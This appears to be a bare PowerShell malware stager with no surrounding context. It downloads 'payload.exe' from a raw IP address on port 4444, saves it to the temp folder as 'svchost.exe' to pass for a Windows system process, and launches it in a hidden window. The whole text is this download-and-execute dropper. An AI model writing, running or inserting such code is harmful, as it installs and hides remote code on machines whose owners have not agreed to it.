$url = 'http://185.220.101.45:4444/payload.exe'
$path = $env:TEMP + '\svchost.exe'
(New-Object Net.WebClient).DownloadFile($url, $path)
Start-Process $path -WindowStyle Hidden
